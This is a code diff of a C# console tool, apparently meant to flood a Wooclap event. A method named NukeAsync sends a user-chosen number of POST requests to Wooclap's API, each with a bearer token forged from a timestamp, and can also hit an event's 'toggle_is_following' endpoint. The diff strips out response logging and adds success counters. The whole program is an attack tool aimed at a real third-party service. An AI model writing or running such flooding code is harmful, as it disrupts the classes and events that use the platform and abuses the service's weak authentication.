@@ -8,9 +8,9 @@ namespace wooclap
         private static String WOOCLAP_ID;
         private static String NUMBER_ATTACK;
         private static String LOST;
+        private static String THREAD;
         static async Task Main(String[] args)
         {
-
             Console.Write("WOOCLAP_ID ?\n> ");
             WOOCLAP_ID = Console.ReadLine();
 
@@ -20,11 +20,18 @@ namespace wooclap
             Console.Write("LOST ? YES or NO\n> ");
             LOST = Console.ReadLine();
 
+            Console.Write("HOW MANY THREAD ?\n>");
+            THREAD = Console.ReadLine();
+
+            if(THREAD == "") {await NukeAsync(); }
+
+        }
+        private static async Task NukeAsync()
+        {
             for (int i = 0; i < int.Parse(NUMBER_ATTACK); i++)
             {
                 String timeStamp = GetTimestamp(DateTime.Now);
                 String url = "https://app.wooclap.com/api/user?slug=" + WOOCLAP_ID;
-
 
                 HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(url));
                 req.Method = "POST";
@@ -32,21 +39,8 @@ namespace wooclap
                 req.Headers.Add("authorization", "bearer z" + timeStamp);
                 req.Accept = "Accept";
 
-                Console.WriteLine(url);
                 WebResponse resp = await req.GetResponseAsync();
-
-                using (Stream stream = resp.GetResponseStream())
-                {
-                    using (StreamReader sr = new StreamReader(stream))
-                    {
-                        var jsonResponse = sr.ReadToEnd();
-                        StreamWriter sw = new StreamWriter("sample_data.json");
-                        sw.Write(jsonResponse);
-                        Console.WriteLine(jsonResponse);
-                        sw.Close();
-                        sr.Close();
-                    }
-                }
+                Console.WriteLine("[ + ] #" + i + "  -> Success");
                 if (LOST == "YES")
                 {
                     String urllost = "https://app.wooclap.com/api/events/" + WOOCLAP_ID + "/toggle_is_following";
@@ -56,23 +50,12 @@ namespace wooclap
                     req0.Headers.Add("authorization", "bearer z" + timeStamp);
                     req0.Accept = "Accept";
                     WebResponse resp0 = await req0.GetResponseAsync();
+                    Console.WriteLine("[ + ] #" + i + "  -> NH Success");
 
-                    using (Stream stream = resp0.GetResponseStream())
-                    {
-                        using (StreamReader sr = new StreamReader(stream))
-                        {
-                            var jsonResponse = sr.ReadToEnd();
-                            StreamWriter sw = new StreamWriter("response.json");
-                            sw.Write(jsonResponse);
-                            Console.WriteLine(jsonResponse);
-                            sw.Close();
-                            sr.Close();
-                        }
-                    }
                 }
             }
-
         }
+
         public static String GetTimestamp(DateTime value)
         {
             return value.ToString("yyyyMMddHHmmssffff");
